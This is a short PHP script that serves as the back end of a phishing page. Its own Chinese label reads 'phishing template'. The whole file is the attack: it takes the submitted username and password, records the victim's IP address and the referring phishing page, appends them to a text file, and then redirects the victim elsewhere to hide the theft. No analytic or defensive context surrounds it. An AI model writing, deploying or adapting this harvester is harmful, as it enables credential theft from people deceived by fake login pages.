<?php
$line = '----------------------------------'."\r\n";
$user = '账号：'.$_POST['username']."\r\n";
$pwd = '密码：'.$_POST['password']."\r\n";
$ip = 'IP：'.getenv('REMOTE_ADDR')."\r\n";
$url = '钓鱼模板：'.getenv('HTTP_REFERER')."\r\n";
$date ='日期：'. date("Y-m-d")."\r\n";
$result = $line.$url.$user.$pwd.$ip.$date;
file_put_contents('good.txt',$result, FILE_APPEND);
header("Location: http://127.0.0.1/admin_index.html");
?>